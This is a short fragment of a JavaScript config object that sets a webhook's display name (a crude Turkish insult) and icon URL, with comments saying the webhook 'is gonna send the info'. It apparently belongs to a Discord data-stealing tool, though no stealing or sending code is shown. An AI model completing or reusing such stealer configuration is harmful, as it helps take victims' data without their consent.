...
const config = {
  ...
  embed_name: 'enayi siktim lol', //name of the webhook thats gonna send the info
  embed_icon: 'https://cdn.discordapp.com/attachments/921070191985705031/989940297767198820/s.png'.replace(/ /g, '%20'), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
